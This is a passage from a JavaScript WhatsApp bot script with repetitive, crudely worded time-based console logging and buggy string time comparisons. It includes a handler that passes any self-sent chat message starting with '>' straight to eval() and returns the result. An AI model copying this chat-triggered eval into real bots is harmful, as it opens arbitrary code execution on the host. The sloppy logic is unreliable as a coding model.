        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(??)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
        }

     if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return xeon.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[jack Bot]", "red"),
        "𝙿𝙴𝙿𝙴 𝚂𝙸𝚁",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed In Consolog 🌿
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// Endシ︎
